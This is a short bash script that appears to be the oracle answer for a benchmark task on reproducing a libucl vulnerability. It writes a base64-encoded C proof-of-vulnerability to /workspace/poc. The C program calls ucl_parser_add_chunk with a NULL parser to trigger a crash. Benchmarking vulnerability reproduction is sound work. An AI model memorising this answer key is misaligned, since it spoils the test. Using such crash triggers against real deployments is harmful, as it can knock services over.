#!/bin/bash
# Reference solution (oracle): materialize the CyberForge ground-truth PoV for
# libucl / vulnerability_FZ_0 (dataset file: conversion/replay_deep/libucl/vulnerability_FZ_0 (program)) at /workspace/poc.
# It does not build anything: grading runs on the task-server's own builds.
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGJvb2wu
aD4KI2luY2x1ZGUgPHVjbC5oPgoKaW50IG1haW4oKSB7CiAgICBjb25zdCB1bnNpZ25lZCBjaGFy
ICpkYXRhID0gKGNvbnN0IHVuc2lnbmVkIGNoYXIgKikia2V5ID0gdmFsdWUiOwogICAgc2l6ZV90
IGxlbiA9IDEwOwogICAgcHJpbnRmKCJDYWxsaW5nIHVjbF9wYXJzZXJfYWRkX2NodW5rIHdpdGgg
TlVMTCBwYXJzZXIuLi5cbiIpOwogICAgYm9vbCByZXN1bHQgPSB1Y2xfcGFyc2VyX2FkZF9jaHVu
ayhOVUxMLCBkYXRhLCBsZW4pOwogICAgcHJpbnRmKCJSZXN1bHQ6ICVzXG4iLCByZXN1bHQgPyAi
dHJ1ZSIgOiAiZmFsc2UiKTsKICAgIHJldHVybiAwOwp9Cg==
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
